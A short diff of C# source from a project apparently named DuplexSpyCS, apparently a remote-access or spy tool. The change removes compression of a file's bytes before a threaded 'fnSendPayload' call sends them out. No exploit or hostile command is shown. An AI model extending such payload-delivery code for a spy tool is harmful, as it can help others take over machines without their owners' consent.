@@ -124,7 +124,6 @@ namespace DuplexSpyCS
             int nThdCnt = (int)numericUpDown1.Value;
             string[] alpArgs = szArgs.Split(' ');
             byte[] abData = File.ReadAllBytes(szFileName);
-            abData = clsTools.Compress(abData);
 
             new Thread(() => fnSendPayload(alpArgs, nThdCnt, abData)).Start();
         }
